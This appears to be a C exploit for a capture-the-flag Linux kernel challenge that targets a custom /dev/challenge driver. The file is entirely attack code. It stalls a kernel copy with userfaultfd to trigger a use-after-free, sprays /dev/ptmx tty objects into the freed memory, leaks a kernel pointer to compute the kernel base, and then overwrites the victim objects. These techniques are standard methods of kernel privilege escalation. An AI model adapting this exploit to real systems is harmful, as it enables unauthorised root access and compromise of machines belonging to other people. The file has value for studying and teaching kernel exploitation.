#define _GNU_SOURCE
#include <stdio.h>
#include <fcntl.h>
#include <stdint.h>
#include <string.h>
#include <sys/ioctl.h>
#include <unistd.h>
#include <sys/syscall.h>
#include <linux/userfaultfd.h>
#include <pthread.h>
#include <sys/mman.h>
#include <poll.h>
#include <stdlib.h>
#include <sched.h>

#define PAGE_SIZE 4096
#define VICTIMS 0x20

struct chall_msg {
    uint64_t index;
    uint64_t id;
    uint64_t size;
    void* buf;
};

int uffd_fd = 0;
int challfd = 0;
int victim_fds[VICTIMS] = {0};

void pin_on_cpu0(){
    cpu_set_t set;
    CPU_ZERO(&set);
    CPU_SET(0,&set);
    sched_setaffinity(0,sizeof(set),&set);
}

void setup_uffd(void* fault_page){
    uffd_fd = syscall(SYS_userfaultfd, O_NONBLOCK);
    struct uffdio_api api = {
        .api = UFFD_API,
        .features = 0,
    };
    if(ioctl(uffd_fd,UFFDIO_API,&api) != 0){
        perror("initialize uffd");
        exit(-1);
    };
    struct uffdio_register reg = {
        .range = {
            .start = fault_page,
            .len = PAGE_SIZE
        },
        .mode = UFFDIO_REGISTER_MODE_MISSING
    };
    if(ioctl(uffd_fd,UFFDIO_REGISTER,&reg) != 0){
        perror("registering fault");
        exit(-1);
    };
}

void* monitor_uffd(void* arg){
    pin_on_cpu0();
    struct pollfd fd = {
        .fd = uffd_fd,
        .events = POLLIN,
    };

    char* test_page = mmap(NULL,PAGE_SIZE,O_RDWR,MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if(test_page == NULL){
        perror("mmap test");
        exit(-1);
    }
    memset(test_page,0x41,PAGE_SIZE);
    printf("Entering thread\n");
    while(poll(&fd,1,-1) > 0){
        printf("Captured event\n");
        if(fd.revents & POLLERR){
            perror("POLLERR");
            exit(-1);
        }
        else if(fd.revents & POLLHUP){
            printf("POLLHUP\n");
            continue;
        }
        struct uffd_msg msg;
        if(read(uffd_fd,&msg,sizeof(msg)) != sizeof(msg)){
            perror("read uffd");
            exit(-1);
        };
        if(msg.event != UFFD_EVENT_PAGEFAULT){
            fprintf(stderr,"Non-pagefault event");
        } else {
            struct chall_msg freemsg;
            memset(&freemsg,0,sizeof(freemsg));
            printf("Performing waf\n");
            ioctl(challfd,0x13370004,&freemsg);
            for(size_t i = 0; i < VICTIMS; i++){
                victim_fds[i] = open("/dev/ptmx",O_RDWR);
            }
            printf("Page fault address: %p\n",msg.arg.pagefault.address);
            struct uffdio_copy copy = {
                .dst = msg.arg.pagefault.address & ~(PAGE_SIZE-1),
                .src = test_page,
                .len = PAGE_SIZE,
            };
            if(ioctl(uffd_fd,UFFDIO_COPY,&copy) != 0){
                perror("copy from uffd");
                exit(-1);
            };
        }
    }
}

int main() {
    pin_on_cpu0();
    setvbuf(stdout,NULL,_IONBF,0);
    setvbuf(stderr,NULL,_IONBF,0);
    setvbuf(stdin,NULL,_IONBF,0);

    challfd = open("/dev/challenge", O_RDONLY);

    void* fault_page = mmap(NULL,PAGE_SIZE,O_RDWR,MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);
    if(fault_page == NULL){
        perror("mmap fault");
        exit(-1);
    }
    printf("Setting up uffd\n");
    setup_uffd(fault_page);
    printf("Creating thread\n");
    pthread_t thread;
    pthread_create(&thread,NULL,monitor_uffd,NULL);
    usleep(0.5e6);

    printf("Getting a leak\n");
    uint64_t leaked[0x2f8/0x8] = {0};
    struct chall_msg leak_create = {.index = 1, .id = 0, .size = 0, .buf = leaked};
    struct chall_msg leak_leak = {.index = 1, .id = 0, .size = 0x2f8, .buf = leaked};
    ioctl(challfd,0x13370001,&leak_create);
    ioctl(challfd,0x13370004,&leak_create);
    int leak_fd = open("/dev/ptmx",O_RDWR);
    close(leak_fd);
    ioctl(challfd,0x13370001,&leak_create);
    ioctl(challfd,0x13370003,&leak_leak);
    uint64_t kbase = leaked[2]-0x12752c0;
    printf("Kernel base leak: 0x%016lx\n",kbase);

    printf("Setting up db state\n");

    char* filler = "xxxxxxxx";
    struct chall_msg fill_msg = { .index = 0, .id = 0x5858585858585858, .size = strlen(filler)+1, .buf = filler};
    struct chall_msg rewrite_msg = { .index = 0, .id = 0x0, .size = 0x20, .buf = fault_page};
    ioctl(challfd,0x13370001,&fill_msg);
    ioctl(challfd,0x13370002,&rewrite_msg);
    printf("Victims overwritten\n");
    char test_buf[256] = {0};
    for(size_t i = 0; i < VICTIMS; i++){
        read(victim_fds[i],&test_buf,sizeof(test_buf));
    }

    munmap(fault_page,PAGE_SIZE);
    close(challfd);
    return 0;
}
